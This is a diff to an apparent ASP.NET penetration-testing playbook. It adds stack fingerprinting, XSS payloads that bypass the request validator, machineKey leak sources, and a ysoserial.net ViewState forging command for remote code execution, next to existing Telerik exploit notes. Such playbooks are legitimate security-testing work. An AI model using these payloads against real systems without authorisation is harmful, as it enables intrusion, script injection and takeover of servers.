@@ -69,11 +69,17 @@ Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embeddi
 ```
 
 **Tech-stack signals:**
-- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS
+- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — Windows + IIS; `Server: Kestrel` (or no Server header behind a reverse proxy) — .NET Core/5-8+
 - `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
-- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth
+- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth; `.AspNetCore.*` (e.g. `.AspNetCore.Antiforgery`, `.AspNetCore.Identity.Application`) — modern ASP.NET Core
 - `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
+- Blazor Server signals — `_blazor` SignalR negotiate endpoint, `blazor.server.js`; Blazor WASM — `_framework/blazor.webassembly.js`, `.dll`/`.wasm` under `_framework/`
 - `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint
+
+**Decision — which ASP.NET playbook applies:**
+- `__VIEWSTATE` present → Webforms → full ViewState/machineKey path below (highest RCE yield).
+- `.AspNetCore.*` cookies / `Kestrel` / `_framework/` → .NET Core/Blazor → ViewState N/A; pivot to data-protection key disclosure (`~/App_Data/keys/key-*.xml` or the configured key-ring), antiforgery/auth, mass-assignment, and the generic web `hunt-*` set.
+- MVC/Razor without `__VIEWSTATE` → no ViewState sink; focus on model-binding over-posting, `@Html.Raw` XSS, and route/authorize-attribute gaps.
 
 ---
 
@@ -173,17 +179,21 @@ grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u
 curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60
 ```
 
-**Request-validator bypass categories:**
+**Request-validator bypass categories** (the validator fires on `<x` patterns in querystring + urlencoded form body; it is NOT universal):
 ```
-# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"
-# Bypasses that sometimes work:
-?q=%3cscript%3e            (URL-encoded — depends on validator config)
-?q=<svg/onload=alert(1)>  (depends on validator version)
-?q=<%00script>             (NUL-byte; older validators)
-?q=javascript:alert(1)     (no < at all — passes validator)
-Cookie: foo=<script>       (cookie body not validated by default)
-Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)
+# Default: <script>alert(1)</script> in ?q= → "A potentially dangerous Request.QueryString value was detected"
+# Note: %3cscript%3e decodes to <script and is STILL caught — URL-encoding alone does not bypass.
+# Bypasses that reach a sink the validator never inspects:
+?q=javascript:alert(1)              (no "<" at all — attribute/href sink XSS, passes validator)
+?q=%uff1cscript%uff1e               (fullwidth/unicode that a downstream normaliser folds to "<")
+Cookie: foo=<script>...             (cookie values not validated by default)
+Referer / User-Agent: <script>...   (request headers not validated)
+Content-Type: application/json body (JSON/XML bodies bypass; validator only sees urlencoded form fields)
+multipart/form-data filename="<svg onload=...>"  (multipart field metadata not validated)
+# Route/path segment (not ?query): scope depends on framework version — test both.
+# requestValidationMode="2.0" in web.config reverts to the weaker legacy validator — test for it.
 ```
+Validation: a bypass is only XSS if the value reaches an HTML/JS sink and **executes** in a victim context — confirm with a unique marker rendered unescaped, not just "the validator let it through."
 
 **Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**
 ```bash
@@ -211,7 +221,7 @@ curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POS
 
 7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.
 
-8. **`<machineKey>` checked into source repos.** Configuration check-ins to GitHub frequently leak validation/decryption keys. Combine with `hunt-misc` source-recon for Telerik / SharePoint / DNN keys.
+8. **`<machineKey>` leaked.** Recovery sources to check, in order of yield: web.config disclosure (LFI / path traversal / backup files `web.config.bak`, `.old`, `~`, `web_config.txt`), `elmah.axd`/`trace.axd` dumping config, source leak / GitHub (`machineKey validationKey=` dorks), decompiled DLLs that hardcode keys (Telerik/DNN historic), and **hardcoded/sample keys from vendor docs or tutorials copy-pasted into prod** (search the leaked key against known public key lists). Combine with `hunt-source-leak` + `hunt-lfi`.
 
 9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).
 
@@ -223,7 +233,7 @@ curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POS
 |---|---|
 | `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |
 | Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |
-| `EnableViewStateMac="true"` enforced | Recover `validationKey` from web.config disclosure or `<machineKey>` AutoGenerate fingerprinting (ysoserial.net `--minify --islegacy` mode generates ViewState that passes some MAC-validation gaps) |
+| `EnableViewStateMac="true"` enforced | Recover `validationKey`+`decryptionKey` from a leak source (see checklist below), then forge with `ysoserial.net -p ViewState -g <gadget> -c <cmd> --generator=<__VIEWSTATEGENERATOR> --validationkey=<K> --validationalg=<alg> [--decryptionkey=<K> --decryptionalg=<alg>]`. No key = no forge; do not claim RCE on a signed-only primitive alone |
 | `trace.axd` localhost-only | Set `X-Forwarded-For: 127.0.0.1` if the trace mode is `localOnly` and the validation uses Request.UserHostAddress (some apps use Forwarded-For instead) |
 | WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |
 | Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |
